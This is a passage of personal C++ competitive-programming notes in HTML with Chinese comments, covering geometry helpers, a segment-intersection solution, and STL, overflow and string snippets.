o.y*s, o.x*s + o.y*c&#125;;<br>&#125;<br><br><span class="hljs-comment">// 表示直线方程</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">line</span>&#123;<br>  <span class="hljs-comment">// 方向 a点 b点</span><br> V d,a,b;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> line <span class="hljs-title">trans</span><span class="hljs-params">(<span class="hljs-type">const</span> V &amp;a,<span class="hljs-type">const</span> V &amp;b)</span></span>&#123;<span class="hljs-comment">//given points</span><br>  <span class="hljs-function">V <span class="hljs-title">dd</span><span class="hljs-params">(b.x-a.x, b.y-a.y)</span></span>;<br>  dd = dd / <span class="hljs-built_in">len</span>(dd);<br>  <span class="hljs-keyword">return</span> (line) &#123;dd, a, b&#125;;<br>&#125;<br><br><span class="hljs-comment">// 方向向量叉积为0</span><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">gongxian</span><span class="hljs-params">(<span class="hljs-type">const</span> line &amp;a,<span class="hljs-type">const</span> line &amp;b)</span> </span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">abs</span>(a.d ^ b.d)&lt;eps;&#125;<br><br><span class="hljs-comment">// 假设为直线，判断交点在不在线段上</span><br><span class="hljs-function"><span class="hljs-keyword">inline</span> V <span class="hljs-title">jiaodian</span><span class="hljs-params">(line u, line v)</span></span>&#123;<br>  <span class="hljs-comment">// 不共线 </span><br><span class="hljs-type">double</span> k = ((v.a - u.a) ^ v.d) / (u.d ^ v.d);<br><span class="hljs-keyword">return</span> u.a + (k * u.d);<br>&#125;<br><br><span class="hljs-comment">// 点到直线的距离</span><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">double</span> <span class="hljs-title">dis</span><span class="hljs-params">(<span class="hljs-type">const</span> line &amp;l,<span class="hljs-type">const</span> V &amp;o,<span class="hljs-type">int</span> op=<span class="hljs-number">0</span>)</span></span>&#123;<span class="hljs-comment">//op=0:dis on line,op=1:dis on segment</span><br>  <span class="hljs-keyword">if</span>(op&amp;&amp;(<span class="hljs-built_in">dun</span>(l.a,o,l.b)||<span class="hljs-built_in">dun</span>(l.b,o,l.a))) <span class="hljs-keyword">return</span> <span class="hljs-built_in">min</span>(<span class="hljs-built_in">len</span>(o-l.a),<span class="hljs-built_in">len</span>(o-l.b));<br> <span class="hljs-comment">// 等面积 - 叉积求面积 </span><br><span class="hljs-comment">// 向量叉积 求三角形 判断共线</span><br> <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-built_in">abs</span>((o-l.a)^(o-l.b))/<span class="hljs-built_in">len</span>(l.a-l.b);<br>&#125;<br><br><span class="hljs-comment">// 椭圆基本性质 x^2 / a^2+ y^2/ b^2 = 1</span><br><span class="hljs-comment">// 三点共线 - 行列式求三角形面积，再判断是否为0. / 点到直接的三角形， 判断是否共线</span><br><br><span class="hljs-keyword">inline</span> V <span class="hljs-keyword">operator</span>+(<span class="hljs-type">const</span> V &amp;a, <span class="hljs-type">const</span> V &amp;b) &#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">V</span>(a.x + b.x, a.y + b.y);&#125;<br><span class="hljs-keyword">inline</span> V <span class="hljs-keyword">operator</span>-(<span class="hljs-type">const</span> V &amp;a, <span class="hljs-type">const</span> V &amp;b) &#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">V</span>(a.x - b.x, a.y - b.y);&#125;<br><span class="hljs-keyword">inline</span> V <span class="hljs-keyword">operator</span>/(<span class="hljs-type">const</span> V &amp;a, <span class="hljs-type">const</span> <span class="hljs-type">double</span> b) &#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">V</span>(a.x / b, a.y / b);&#125;<br><span class="hljs-keyword">inline</span> V <span class="hljs-keyword">operator</span>*(<span class="hljs-type">const</span> V &amp;a, <span class="hljs-type">const</span> <span class="hljs-type">double</span> b) &#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">V</span>(a.x * b, a.y * b);&#125;<br><span class="hljs-type">double</span> <span class="hljs-keyword">operator</span>*(<span class="hljs-type">const</span> V &amp;a, <span class="hljs-type">const</span> V &amp;b) &#123; <span class="hljs-keyword">return</span> a.x * b.x + a.y * b.y;&#125;<br><span class="hljs-type">double</span> <span class="hljs-keyword">operator</span>^(<span class="hljs-type">const</span> V &amp;a, <span class="hljs-type">const</span> V &amp;b) &#123; <span class="hljs-keyword">return</span> a.x * b.y - a.y * b.x;&#125;<br><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">len</span><span class="hljs-params">(<span class="hljs-type">const</span> V&amp; a)</span> </span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">sqrt</span>(a.x * a.x + a.y *a.y);&#125;<br><br><span class="hljs-function">V <span class="hljs-title">get_intersection</span><span class="hljs-params">(line &amp;a, line &amp;b)</span> </span>&#123;<br>    <span class="hljs-type">double</span> k = ((b.a - a.a) ^ b.d) / (a.d ^ b.d);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">V</span>(a.a + a.d * k);<br>&#125;<br><br><span class="hljs-function">line <span class="hljs-title">transform</span><span class="hljs-params">(<span class="hljs-type">const</span> V &amp;a, <span class="hljs-type">const</span> V &amp;b)</span></span>&#123;<br>    V dd = <span class="hljs-built_in">V</span>(b.x - a.x, b.y - a.y);<br>    dd = dd / <span class="hljs-built_in">len</span>(dd);<br>    <span class="hljs-keyword">return</span> line&#123;dd, a, b&#125;;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">is_para</span><span class="hljs-params">(<span class="hljs-type">const</span> line &amp;a, <span class="hljs-type">const</span> line &amp;b)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">abs</span>(a.d ^ b.d) &lt; eps;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">is_Same</span><span class="hljs-params">(<span class="hljs-type">const</span> line &amp;a, <span class="hljs-type">const</span> line &amp;b)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">abs</span>((b.a - a.a) ^ (b.a - a.b)) &lt; eps;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">is_inline</span><span class="hljs-params">(<span class="hljs-type">const</span> line &amp;a, <span class="hljs-type">const</span> V &amp;b)</span> </span>&#123;<br>    <span class="hljs-type">double</span> l = a.a.x, r = a.b.x;<br>    <span class="hljs-type">bool</span> res = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">if</span> (l &gt; r) <span class="hljs-built_in">swap</span>(l, r);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">abs</span>(l - r) &gt; eps) &#123;<br>        res = res | (l &lt;= b.x &amp;&amp; b.x &lt;= r);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">double</span> ll = a.a.y, rr = a.b.y;<br>        <span class="hljs-keyword">if</span> (ll &gt; rr) <span class="hljs-built_in">swap</span>(ll, rr);<br>        res = res | (ll &lt;= b.y &amp;&amp; b.y &lt;= rr);<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">double</span>&gt; <span class="hljs-title">intersection</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; start1, vector&lt;<span class="hljs-type">int</span>&gt;&amp; end1, vector&lt;<span class="hljs-type">int</span>&gt;&amp; start2, vector&lt;<span class="hljs-type">int</span>&gt;&amp; end2)</span> </span>&#123;<br>        <span class="hljs-function">V <span class="hljs-title">a</span><span class="hljs-params">(start1[<span class="hljs-number">0</span>], start1[<span class="hljs-number">1</span>])</span>, <span class="hljs-title">b</span><span class="hljs-params">(end1[<span class="hljs-number">0</span>], end1[<span class="hljs-number">1</span>])</span>, <span class="hljs-title">c</span><span class="hljs-params">(start2[<span class="hljs-number">0</span>], start2[<span class="hljs-number">1</span>])</span>, <span class="hljs-title">d</span><span class="hljs-params">(end2[<span class="hljs-number">0</span>], end2[<span class="hljs-number">1</span>])</span></span>;<br>        <span class="hljs-keyword">if</span> (a.x &gt; b.x) <span class="hljs-built_in">swap</span>(a, b);<br>        <span class="hljs-keyword">if</span> (c.x &gt; d.x) <span class="hljs-built_in">swap</span>(c, d);<br>        <span class="hljs-keyword">if</span> (a.x == b.x) <span class="hljs-keyword">if</span> (a.y &gt; b.y) <span class="hljs-built_in">swap</span>(a, b);<br>        <span class="hljs-keyword">if</span> (c.x == d.x) <span class="hljs-keyword">if</span> (c.y &gt; d.y) <span class="hljs-built_in">swap</span>(c, d);<br>        <span class="hljs-keyword">if</span> (a.x &gt; c.x) &#123;<br>            <span class="hljs-built_in">swap</span>(a, c);<br>            <span class="hljs-built_in">swap</span>(b, d);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a.x == c.x) &#123;<br>            <span class="hljs-keyword">if</span> (a.y &gt; c.y) &#123;<br>                <span class="hljs-built_in">swap</span>(a, c);<br>                <span class="hljs-built_in">swap</span>(b, d);<br>            &#125;<br>        &#125;<br><br>        line l1 = <span class="hljs-built_in">transform</span>(a, b);<br>        line l2 = <span class="hljs-built_in">transform</span>(c, d);<br>        vector&lt;<span class="hljs-type">double</span>&gt; ans;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">is_para</span>(l1, l2)) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">is_Same</span>(l1, l2)) <span class="hljs-keyword">return</span> ans;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (c.x &gt; b.x) <span class="hljs-keyword">return</span> ans;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(a.x != c.x) &#123;<br>                    ans = &#123;c.x, c.y&#125;;<br>                    <span class="hljs-keyword">return</span> ans;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (a.x == c.x) &#123;<br>                    <span class="hljs-keyword">if</span> (c.y &gt; b.y) <span class="hljs-keyword">return</span> ans;<br>                    <span class="hljs-keyword">else</span> &#123;<br>                        ans = &#123;c.x, c.y&#125;;<br>                        <span class="hljs-keyword">return</span> ans;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            V target = <span class="hljs-built_in">get_intersection</span>(l1, l2);<br>            <span class="hljs-type">bool</span> r1 = <span class="hljs-built_in">is_inline</span>(l1, target);<br>            <span class="hljs-type">bool</span> r2 = <span class="hljs-built_in">is_inline</span>(l2, target); <br>            <span class="hljs-keyword">if</span> (r1 &amp;&amp; r2) &#123;<br>                ans = &#123;target.x, target.y&#125;;<br>                <span class="hljs-keyword">return</span> ans;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="basic">basic</h2><h3 id="define">define</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">// #define int long long</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ll long long</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> vi vector<span class="hljs-string">&lt;ll&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> vvi vector<span class="hljs-string">&lt;vi&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> rep(i, a, b) for(auto i = (a); (i) &lt; (b); (i)++)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> rrep(i, b, a) for (auto i = (b); (i) &gt; (a); (i)--)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fastio std::ios_base::sync_with_stdio(false); cin.tie(NULL);</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> all(v) (v).begin(), (v).end()</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> sz(v) (int)(v).size()</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ump unordered_map<span class="hljs-string">&lt;ll, ll&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pub push_back </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pob pop_back</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> arr array<span class="hljs-string">&lt;ll, 3&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pii pair<span class="hljs-string">&lt;ll, ll&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fi first</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> se second</span><br></code></pre></td></tr></table></figure><h3 id="uniquecountfindrotate">unique/count/find/rotate</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++">nums.<span class="hljs-built_in">erase</span>(<span class="hljs-built_in">unique</span>(nums.<span class="hljs-built_in">begin</span>(), nums.<span class="hljs-built_in">end</span>()), nums.<span class="hljs-built_in">end</span>());<br><span class="hljs-keyword">auto</span> cnt = <span class="hljs-built_in">count</span>(<span class="hljs-built_in">all</span>(s),<span class="hljs-string">&#x27;1&#x27;</span>);<br>std::<span class="hljs-type">size_t</span> found = str.<span class="hljs-built_in">find</span>(str2);<br><span class="hljs-built_in">find</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), item);<br><br><span class="hljs-comment">// 1 2 3 4 5 6 7 8 9 -&gt; 4 5 6 7 8 9 1 2 3</span><br>std::<span class="hljs-built_in">rotate</span>(myvector.<span class="hljs-built_in">begin</span>(),myvector.<span class="hljs-built_in">begin</span>()+<span class="hljs-number">3</span>,myvector.<span class="hljs-built_in">end</span>());<br><br><span class="hljs-built_in">accumulate</span>(v.<span class="hljs-built_in">begin</span>(), v.<span class="hljs-built_in">end</span>(), initial_sum);<br></code></pre></td></tr></table></figure><h3 id="初始化">初始化</h3><p><strong>使用引用接收参数/返回值</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// debug</span><br><span class="hljs-comment">// +-DLOCAL</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> LOCAL</span><br>    <span class="hljs-built_in">freopen</span>(<span class="hljs-string">&quot;data.in&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, stdin);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">// 引用部分</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span> #<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;climits&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> debug(a) cout &lt;&lt; #a &lt;&lt; <span class="hljs-string">&quot; = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mod(x) (x) % MOD</span><br><span class="hljs-comment">// 声明</span><br><span class="hljs-keyword">using</span> ULL = <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>;<br><span class="hljs-keyword">typedef</span> ;<br><br><span class="hljs-comment">// arr</span><br><span class="hljs-comment">// INT_MAX注意溢出 10..9</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> INF = <span class="hljs-number">0x3f3f3f3f</span>;<br><span class="hljs-comment">// 初始化 </span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">1001</span>;<br><span class="hljs-comment">// INT_MAX注意溢出 10..9</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> INF = <span class="hljs-number">0x3f3f3f3f</span>;<br><span class="hljs-comment">// -1 全为1 0 0x3f</span><br><span class="hljs-type">int</span> w[maxn][maxn];<br><span class="hljs-built_in">fill</span>(&amp;w[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>], &amp;w[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + maxn * maxn, INF);<br><span class="hljs-built_in">memset</span>(w, <span class="hljs-number">-1</span>, <span class="hljs-built_in">sizeof</span>(w));<br><br><span class="hljs-comment">// vector</span><br><span class="hljs-comment">// Using assignment operator to copy one</span><br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">vec</span>(m, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; (n, <span class="hljs-number">0</span>));<br>vect2 = vect1;<br></code></pre></td></tr></table></figure><h3 id="指针-1">指针</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 回文串反向</span><br><span class="hljs-built_in">string</span>(prefix + prefix.<span class="hljs-built_in">rbegin</span>() + (len &amp; <span class="hljs-number">1</span>), prefix.<span class="hljs-built_in">rend</span>());<br><br><span class="hljs-comment">// 距离 注意set O(n)</span><br><span class="hljs-built_in">distance</span>(a.begin, <span class="hljs-built_in">lower_bound</span>(c));<br><br><span class="hljs-comment">// List</span><br><span class="hljs-comment">// doubly linked list</span><br>List&lt;<span class="hljs-type">int</span>&gt; a;<br><span class="hljs-comment">// dynamic array</span><br>deque&lt;<span class="hljs-type">int</span>&gt; b;<br><br><span class="hljs-comment">// 声明迭代器</span><br>list&lt;Node&gt;::iterator cur = m[key];<br></code></pre></td></tr></table></figure><h3 id="赋值删除">赋值/删除</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> VI=vector&lt;<span class="hljs-type">int</span>&gt;;<br><span class="hljs-keyword">using</span> VLL=vector&lt;LL&gt;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> next(p) (p == n-1 ? 0 : p + 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev(p) (p == 0 ? n - 1 : p - 1)</span><br><br><span class="hljs-comment">// ull a &gt; -1 恒成立</span><br><span class="hljs-comment">// val to bool !2-false !!2 = true</span><br>!!<span class="hljs-number">2</span>  <br><span class="hljs-comment">// 赋值并清空</span><br>a = <span class="hljs-built_in">move</span>(b);<br><br><span class="hljs-comment">// 浮点计算 不用double 前置1.0即可</span><br><span class="hljs-type">double</span> cx1 = <span class="hljs-number">1.0</span> * (b[r] - b[p]) / (k[r] - k[p]);<br><span class="hljs-type">double</span> x_min = <span class="hljs-number">1e100</span>, x_max = <span class="hljs-number">-1e100</span>;<br><span class="hljs-type">double</span> y_min = <span class="hljs-number">1e100</span>, y_max = <span class="hljs-number">-1e100</span>;<br><br><span class="hljs-comment">// swap </span><br><span class="hljs-built_in">swap</span>(a, b);<br><br><span class="hljs-comment">// unique</span><br><span class="hljs-built_in">sort</span>(nums.<span class="hljs-built_in">begin</span>(),nums.<span class="hljs-built_in">end</span>());<br><span class="hljs-comment">// unique array and return the last interator</span><br>nums.<span class="hljs-built_in">erase</span>(<span class="hljs-built_in">unique</span>(nums.<span class="hljs-built_in">begin</span>(), nums.<span class="hljs-built_in">end</span>()), nums.<span class="hljs-built_in">end</span>());<br><br><span class="hljs-comment">// map</span><br>it = mymap.<span class="hljs-built_in">find</span>(<span class="hljs-string">&#x27;b&#x27;</span>);<br><span class="hljs-keyword">if</span> (it != mymap.<span class="hljs-built_in">end</span>())<br>    mymap.<span class="hljs-built_in">erase</span> (it);<br><br><span class="hljs-comment">// multiset 只删一个</span><br>ms.<span class="hljs-built_in">erase</span>(ms.<span class="hljs-built_in">find</span>(v));<br><br><span class="hljs-comment">// 获取前值</span><br><span class="hljs-comment">// decomposition declaration</span><br><span class="hljs-keyword">auto</span> [u, mask, dist] = q.<span class="hljs-built_in">front</span>();<br><span class="hljs-comment">// 栈入</span><br>q.<span class="hljs-built_in">emplace</span>(i, <span class="hljs-number">1</span> &lt;&lt; i, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// array 代替tuple</span><br>array&lt;<span class="hljs-type">int</span>, 3&gt; p = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br><span class="hljs-comment">// 从小到大</span><br>priority_queue&lt;arr, vector&lt;arr&gt;, greater&lt;arr&gt;&gt; pq;<br><br><br><span class="hljs-comment">// 合并集合</span><br>pre[next].<span class="hljs-built_in">insert</span>(pre[course].<span class="hljs-built_in">begin</span>(),pre[course].<span class="hljs-built_in">end</span>());<br><br><span class="hljs-comment">// function </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;functional&gt;</span></span><br><span class="hljs-comment">// 省去全局变量</span><br>function&lt;<span class="hljs-type">void</span>(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>)&gt; dfs = [&amp;](<span class="hljs-type">int</span> cur, <span class="hljs-type">int</span> pre) &#123;<br>    cout &lt;&lt; <span class="hljs-number">1</span> &lt;&lt; endl;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="逻辑">逻辑</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// while 循环</span><br><span class="hljs-keyword">while</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n;) &#123;<br>    <span class="hljs-type">int</span> tmp = i;<br>    <span class="hljs-keyword">while</span>(tmp &lt; n &amp;&amp; a[i] == a[tmp]) tmp++;<br>&#125;<br><span class="hljs-comment">// for 循环</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; i &lt; n; i++);<br><br><span class="hljs-comment">// goto  </span><br><span class="hljs-keyword">goto</span> end;<br>end:;<br><br><span class="hljs-comment">// sort</span><br>order = <span class="hljs-built_in">VI</span>(n);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; n;i++)order[i] = i;<br><span class="hljs-comment">// order与index</span><br><span class="hljs-built_in">sort</span>(order.<span class="hljs-built_in">begin</span>(),order.<span class="hljs-built_in">end</span>(),[&amp;](<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)&#123;<span class="hljs-keyword">return</span> a[x] &gt; a[y];&#125;);<br><br><br></code></pre></td></tr></table></figure><h3 id="数字">数字</h3><ol type="1"><li><p>float/bit表示</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 0x 16进制 0b 2-bit 0o 8-bit  </span><br><span class="hljs-comment">// 2^3 注意10^5有六位</span><br><span class="hljs-number">0x1e5</span>,<span class="hljs-number">0x1</span>p3,<span class="hljs-number">1e5</span>;<br><br><span class="hljs-comment">// 奇数 偶数 -&gt; 已 a &amp; 1 来表示</span><br>arr[a&amp;<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">// ull (1 &lt;&lt; 64) - 1 bit</span><br>INT_MAX = (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>) - <span class="hljs-number">1</span><br>INT_MIN = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span> (~<span class="hljs-number">0</span>);<br><span class="hljs-comment">// !注意通过1ll来移动</span><br>Long = <span class="hljs-number">1ll</span> &lt;&lt; <span class="hljs-number">31</span>;<br><span class="hljs-comment">// 通过stoull转化</span><br><br><span class="hljs-type">char</span> buffer[<span class="hljs-number">20</span>];<br><span class="hljs-built_in">sprintf</span>(buffer, <span class="hljs-string">&quot;%.2f&quot;</span>, a); <span class="hljs-comment">//...</span><br><br><span class="hljs-built_in">sscanf</span>(s.<span class="hljs-built_in">c_str</span>(), <span class="hljs-string">&quot;farmat&quot;</span>, &amp;num); <br><span class="hljs-comment">// round - (int)(x + 0.5)</span><br><span class="hljs-comment">// round(x * 100) / 100 - 四舍五入</span><br></code></pre></td></tr></table></figure></li><li><p>溢出</p><p><strong>abs/max出现溢出</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// ! 防止溢出 </span><br><span class="hljs-built_in">llabs</span>();<br><br><span class="hljs-comment">// c++对负数取模不同于python</span><br><span class="hljs-comment">// python -1 // 10 = -1 向负无穷取整，C向0取整</span><br>a == (a / b * b) + a % b;  <br><span class="hljs-comment">// ture mudulo python</span><br><span class="hljs-number">-1</span> % <span class="hljs-number">10</span> = <span class="hljs-number">9</span>;<br><span class="hljs-comment">// C的取整</span><br><span class="hljs-number">-1</span> % <span class="hljs-number">10</span> = <span class="hljs-number">-1</span>;<br><br><span class="hljs-comment">// size_t(0uz) greater than 0 unsigned  </span><br><span class="hljs-comment">// unsigned int overflow 从0重新开始</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="字符串">字符串</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// transform </span><br><span class="hljs-built_in">stoi</span>();<br><span class="hljs-comment">// string to ull</span><br><span class="hljs-comment">// 0开始 的长度为x的子串</span><br><span class="hljs-built_in">stoull</span>(n.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, 